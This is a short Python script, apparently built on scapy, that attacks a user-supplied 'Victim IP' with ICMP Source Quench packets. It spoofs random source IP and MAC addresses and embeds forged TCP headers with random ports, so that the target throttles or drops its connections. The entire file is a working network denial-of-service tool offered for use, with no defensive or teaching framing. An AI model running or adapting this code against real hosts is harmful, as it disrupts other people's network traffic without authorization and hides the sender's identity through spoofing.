from scapy.all import *
from getmac import get_mac_address
import random
import time

# Automatically get the MAC Address if IP exists on the network
def GetMacAddress(IP):
    mac = get_mac_address(ip = IP)
    if (mac==None):
        print("No one has " + str(IP) + ". (No MAC address found for this given IP)")
        sys.exit(2)
    return mac

#Build and send ICMP Quench packet
def send_icmpBlind_packet(src_ip, dest_ip, src_mac, dest_mac, src_port, dest_port):
	eth_h = Ether(src=src_mac, dst=dest_mac)
	ip_h = IP(dst=dest_ip, src=src_ip)
	icmp_h = ICMP(type=4, code=4)
	ip2_h = IP(dst=dest_ip, src=src_ip, proto=6, flags=0x02)
	tcp2_h = TCP(sport=src_port, dport=dest_port)
	pkt = eth_h/ip_h/icmp_h/ip2_h/tcp2_h
	sendp(pkt)

# Prepare inputs for packet
def prepare(dest, packetsToSend):
    src_ip = RandIP()
    dest_ip = dest
    src_mac = RandMAC()
    dest_mac = GetMacAddress(dest_ip)

    for _ in range (packetsToSend):
        send_icmpBlind_packet(src_ip, dest_ip, src_mac, dest_mac, random.randint(1024, 65535), random.randint(1024, 65535))


def check(inputIp, packetsToSend):
    try:
        packetsToSend = int(packetsToSend)
    except:
        print("Packet to send input must be an integer!")
        sys.exit(2)
    prepare(str(inputIp), packetsToSend)

inputIp = input("Victim IP: ")
packetsToSend = input("# of ICMP Quench packets to send: ")
check(inputIp, packetsToSend)